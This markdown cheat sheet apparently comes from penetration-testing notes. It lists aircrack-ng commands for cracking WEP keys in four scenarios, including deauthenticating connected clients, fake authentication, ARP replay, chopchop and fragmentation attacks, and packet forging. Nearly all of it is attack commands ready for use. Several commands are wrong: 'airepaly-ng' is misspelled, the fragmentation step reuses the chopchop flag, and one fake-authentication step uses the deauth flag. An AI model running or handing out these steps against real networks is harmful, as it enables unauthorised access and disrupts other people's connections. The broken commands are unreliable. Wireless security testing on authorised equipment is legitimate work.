# Cracking Wep<a name="WEP"></a>

## WEP - With connected Clients<a name="WEP-ConnectedClients"></a>

Place your wireless card into monitor mode on the channel number of the AP:

```
airmon-ng start <interface> <AP channel>
```
 
Start and Airodump-ng capture filtering on the AP channel and BSSID, saving the file to disk:
 
```
airodump-ng -c <AP Channel> --bssid <AP MAC> -w <capture> <interface>
```

Conduct a fake authentication attack against the AP:

```
aireplay-ng -1 0 -e <ESSID> -a <AP MAC> -h <Your MAC> <interface>
```
 
Launch the ARP request replay attack:

```
aireplay-ng -3 -b <AP MAC> -h <Your MAC> <interface>
```
 
Deauthenticate the connected client to force new IV generation by the AP:

```
airepaly-ng -0 1 -a <AP MAC> -c <Client MAC> <interface>
```
 
Once a significant number of IVs have been captured, run Aircrack-ng against the Airodump capture:

```
aircrack-ng <capture>
```
 
## WEP - Via a Client<a name="WEP-Client"></a>

Place your wireless card into monitor mode on the AP channel:

```
airmon-ng start <interface> <AP channel>
```

Start a capture dump, filtering on the AP channel and BSSID, saving the capture to a file:

```
airodump-ng -c <AP channel> --bssid <AP MAC> -w <capture> <interface>
```

Next, conduct a fake authentication against the access point:

```
aireplay-ng -0 1 -e <ESSID> -a <AP MAC> -w <capture> <interface>
```

Launch the interactive packet replay attack looking for ARP packets coming from the AP:

```
aireplay-ng -2 -b <AP MAC> -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 <interface>
```

Once enough IVs have been captured, crack the WEP key:

```
aircrack-ng -z <capture>
```

## WEP - Clientless<a name="WEP-Clientless"></a>

Place your wireless card into monitor mode on the channel number of the AP:

```
airmon-ng start <interface> <AP channel>
```

Conduct a fake authentication attack against the AP:

```
aireplay-ng -1 0 -e <ESSID> -a <AP MAC> -h <Your MAC> <interface>
```

Run attack 4, the KoreK chopchop attack (or attack 5, the fragmentation attack):

### KoreK Chop Chop Attack
```
aireplay-ng -4 -b <AP MAC> -h <Your MAC> <interface>
````

### Fragmentation Attack
```
aireplay-ng -4 -b <AP MAC> -h <Your MAC> <interface>
```

Craft an ARP request packet using packetforge-ng:

```
packetforge-ng -0 -a <AP MAC> -h <Your MAC> -l <Source IP> -k <Dest IP> -y <xor filename> -w <output filename>
```

Inject the packet into the network using attack 2, the interactive packet replay attack:

```
aireplay-ng -2 -r <packet filename> <interface>
```

Crack the WEP key using Aircrack-ng:

```
aircrack-ng <capture>
```

## WEP - Bypassing Shared Key Authentication<a name="WEP-Bypass-SKA"></a>

Place your wireless card into monitor mode on the channel number of the AP:

```
airmon-ng start <interface> <AP channel>
```

Start an Airodump-ng capture, filtering on the AP channel and BSSID, saving the capture:

```
airodump-ng -c <AP channel> --bssid <AP MAC> -w <capture> <interface>
```

Deauthenticate the connected client to capture the PRGA XOR keystream:

```
aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface>
```

Conduct a fake shared key authentication using the XOR keystream:

```
aireplay-ng -1 0 -e <ESSID> -y <keystreamfile> -a <AP MAC> -h <Your MAC> <interface>
```

Launch the ARP request replay attack:

```
aireplay-ng -3 -b <AP MAC> -h <Your MAC> <interface>
```

Deauthenticate the victim client again to force the generation of an ARP packet:

```
aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface>
```

Once IVs are being generated by the AP, run Aircrack-ng against the capture:

```
aircrack-ng <capture>
```
